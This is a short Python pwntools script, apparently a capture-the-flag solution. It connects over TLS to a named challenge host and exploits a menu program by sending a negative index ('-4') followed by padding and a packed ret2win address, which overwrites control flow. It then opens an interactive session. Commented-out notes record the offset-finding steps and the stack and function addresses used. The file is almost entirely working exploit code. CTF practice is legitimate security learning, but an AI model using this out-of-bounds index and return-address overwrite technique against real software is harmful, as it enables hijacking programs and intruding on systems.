from pwn import *
import ssl

context.log_level = 'debug'
context.arch = 'amd64'  

ret2win_addr = 0x4012b8
host = 'got-e35470a6c0a83943.deploy.phreaks.fr'
port = 443
r = remote(host, 443, ssl=True)


r.recvuntil(b"Which name is misspelled ?\n1. John\n")

r.sendline(b"-4")

r.recvuntil(b"Oh really ? What's the correct spelling ?\n")

r.sendline(b"A" * 8 + p64(ret2win_addr))

r.interactive()


# core = p.corefile
# rip_value = core.fault_addr

# offset = cyclic_find(rip_value)

# log.info(f"Offset found: {offset}")

# p.close()

# 0x00007fffffffd8c8 # ret
# 0x00007fffffffd8b4 # idx
# 0x0000000000404080 # PNJ
# 0x7ffff7c87be0 # puts
# 0x004012b8 # ret2win